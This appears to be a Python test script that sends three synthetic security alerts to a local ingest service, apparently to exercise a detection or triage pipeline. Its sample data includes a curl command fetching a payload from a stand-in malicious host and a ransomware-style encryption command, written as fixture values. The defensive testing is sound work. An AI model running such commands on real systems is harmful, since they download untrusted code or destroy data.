import requests, time
SAMPLES = [
    { "id":"alert-ransom-001", "source":"osquery", "observables":{"hostname":"finance-db-01","ip":"10.0.5.12","cmdline":"/usr/bin/encrypt --target /data --ransom","filehash":"abcd1234deadbeef"} },
    { "id":"alert-c2-001", "source":"suricata", "observables":{"hostname":"user-24","ip":"192.168.1.24","cmdline":"curl http://malicious.example.com/payload -o /tmp/x","process":"curl"} },
    { "id":"alert-noise-001", "source":"suricata", "observables":{"hostname":"user-11","ip":"203.0.113.5","cmdline":"python script.py --check","process":"python"} }
]
if __name__ == '__main__':
    for i in range(6):
        s = SAMPLES[i % len(SAMPLES)]
        try:
            r = requests.post('http://localhost:8000/ingest', json=s, timeout=5)
            print('sent', s['id'], '->', r.status_code)
        except Exception as e:
            print('failed to send', s['id'], e)
        time.sleep(1)
